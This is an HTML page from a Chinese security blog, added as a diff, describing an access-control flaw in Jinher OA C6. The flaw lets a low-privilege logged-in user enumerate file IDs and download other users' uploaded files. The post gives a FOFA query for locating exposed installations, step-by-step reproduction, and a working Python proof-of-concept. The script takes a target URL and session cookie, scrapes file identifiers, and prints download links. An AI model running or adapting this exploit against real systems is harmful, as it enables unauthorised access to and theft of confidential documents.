@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="金和OA C6 后台越权敏感文件遍历漏洞漏洞描述金和OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件 漏洞影响 [!NOTE] 金和OA C6  FOFA [!NOTE] app&#x3D;”Jinher-OA”  漏洞复现登录后点击信息交流，发起协同页面 ![](&#x2F;resource&#x2F;金和OA-C6-后台越权敏感文件遍历漏洞&#x2F;media&#x2F;1.png)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/%E9%87%91%E5%92%8Coa/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="金和OA C6 后台越权敏感文件遍历漏洞漏洞描述金和OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件 漏洞影响 [!NOTE] 金和OA C6  FOFA [!NOTE] app&#x3D;”Jinher-OA”  漏洞复现登录后点击信息交流，发起协同页面 ![](&#x2F;resource&#x2F;金和OA-C6-后台越权敏感文件遍历漏洞&#x2F;media&#x2F;1.png)">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:26:10.134Z">
+<meta property="article:modified_time" content="2022-07-08T09:06:16.857Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-金和oa/金和OA C6 后台越权敏感文件遍历漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%87%91%E5%92%8Coa/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:10.134Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="金和OA-C6-后台越权敏感文件遍历漏洞"><a href="#金和OA-C6-后台越权敏感文件遍历漏洞" class="headerlink" title="金和OA C6 后台越权敏感文件遍历漏洞"></a>金和OA C6 后台越权敏感文件遍历漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>金和OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>金和OA C6</p>
+</blockquote>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><blockquote>
+<p>[!NOTE]</p>
+<p>app=”Jinher-OA”</p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录后点击信息交流，发起协同页面</p>
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/1.png)</p>
+<p>上传附件并上传发送给目标</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>这里登录权限为管理员，我们自己发给自己就好，前文只是展现漏洞挖掘思路过程</p>
+</blockquote>
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/2.png)</p>
+<p>成功收到上传的附件</p>
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/3.png)</p>
+<p>点击查看时抓包，发现一个带有文件ID的请求包</p>
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/4.png)</p>
+<p>返回了几个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var strFilePath = &#x27;../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png&#x27;;</span><br><span class="line">var strFileType = &#x27;png&#x27;;</span><br><span class="line">var strSid=&#x27;3jvpvhs410m2wdbbficax5q5&#x27;;</span><br><span class="line">var strFileIDCode=&#x27;us9w7xWE7do=&#x27;;</span><br><span class="line">var strId = &#x27;1229&#x27;;</span><br><span class="line">var strTxtReg = &#x27;txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log&#x27;;</span><br><span class="line">var strImgReg = &#x27;jpg,gif,jpeg,png,ico&#x27;;</span><br><span class="line">var MD = &#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>其中我们注意到 strFilePath 为文件的存储地址，我们更改 id参数为另一个值，且测试后发现 name文件名参数无关紧要</p>
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/5.png)</p>
+<p>更改ID后发送请求包发现获得另一个文件的信息</p>
+<p>访问Url，注意 **type参数 ** 需要为正确的文件后缀才可以访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200&amp;name=&amp;type=pdf</span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/6.png)</p>
+<p>这里更换一个普通用户测试是否可行，尝试遍历 id</p>
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/7.png)</p>
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/8.png)</p>
+<p>存在 <strong>strFilePath参数</strong> 则是存在文件，为空则是文件已经不存在</p>
+<p>同时抓包下载文件页面也可以看到可获取的参数</p>
+<p><strong>FileID 与 FileIDCode</strong></p>
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/9.png)</p>
+<p>于是只需要通过刚刚的ID遍历，获取两个关键参数就能下载其他人发送的敏感文件，且只需要普通用户权限</p>
+<h2 id="漏洞利用POC"><a href="#漏洞利用POC" class="headerlink" title="漏洞利用POC"></a>漏洞利用POC</h2><blockquote>
+<p>[!NOTE]</p>
+<p>POC只检测是否存在漏洞，且漏洞存在于后台需要登录</p>
+<p>运行后访问链接即可下载文件</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34m公众号  : PeiQi文库                                                   \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[34mVersion: 金和OA C6                                                  \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36m使用格式:  python3 poc.py                                            \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+------------------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">POC_1</span>(<span class="params">target_url, file_id, cookie</span>):</span><br><span class="line">    vuln_url = target_url + <span class="string">&quot;/C6/control/OpenFile.aspx?id=&#123;&#125;&amp;name=&amp;type=pdf&quot;</span>.<span class="built_in">format</span>(file_id)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:cookie</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response = requests.get(url=vuln_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] 正在请求 Url: &#123;&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(vuln_url))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;strFilePath =&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">and</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            strFilePath = re.findall(<span class="string">r&quot;var strFilePath = &#x27;(.*?)&#x27;;&quot;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">            strFileType = strFilePath[-<span class="number">3</span>:]</span><br><span class="line">            strFileIDCode = re.findall(<span class="string">r&quot;var strFileIDCode=&#x27;(.*?)&#x27;;&quot;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">            strId = re.findall(<span class="string">r&quot;var strId = &#x27;(.*?)&#x27;;&quot;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">            sid = re.findall(<span class="string">r&#x27;ASP.NET_SessionId=(.*?);&#x27;</span>, cookie)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> strFilePath != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\033[36m[o] 目标 &#123;&#125; 存在漏洞, 获取文件信息:\n[o] 文件路径：&#123;&#125;\n[o] 文件类型：&#123;&#125;\n[o] 文件ID code：&#123;&#125;\n[o] 文件编号： &#123;&#125;\033[0m&quot;</span>.<span class="built_in">format</span>(target_url, strFilePath, strFileType,strFileIDCode, strId ))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\033[32m[o] 文件下载链接为: &#123;&#125;/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=&amp;FileID=&#123;&#125;&amp;FileIDCode=&#123;&#125;&amp;sid=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(target_url, strId, strFileIDCode, sid))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125; 文件不存在     \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞     \033[0m&quot;</span>.<span class="built_in">format</span>(target_url))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\033[31m[x] 请求失败 \033[0m&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    file_id = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mFile_id &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    cookie = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;\033[35mCookie  &gt;&gt;&gt; \033[0m&quot;</span>))</span><br><span class="line">    POC_1(target_url, file_id, cookie)</span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/金和OA-C6-后台越权敏感文件遍历漏洞/media/10.png)</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%87%91%E5%92%8Coa/%E9%87%91%E5%92%8COA%20C6%20%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r0ep00pgy8v11u2ph7ib" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/%E9%87%91%E5%92%8Coa/%E9%87%91%E5%92%8COA%20C6%20%E7%AE%A1%E7%90%86%E5%91%98%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6%20%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%20%E5%90%8E%E5%8F%B0XSS%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
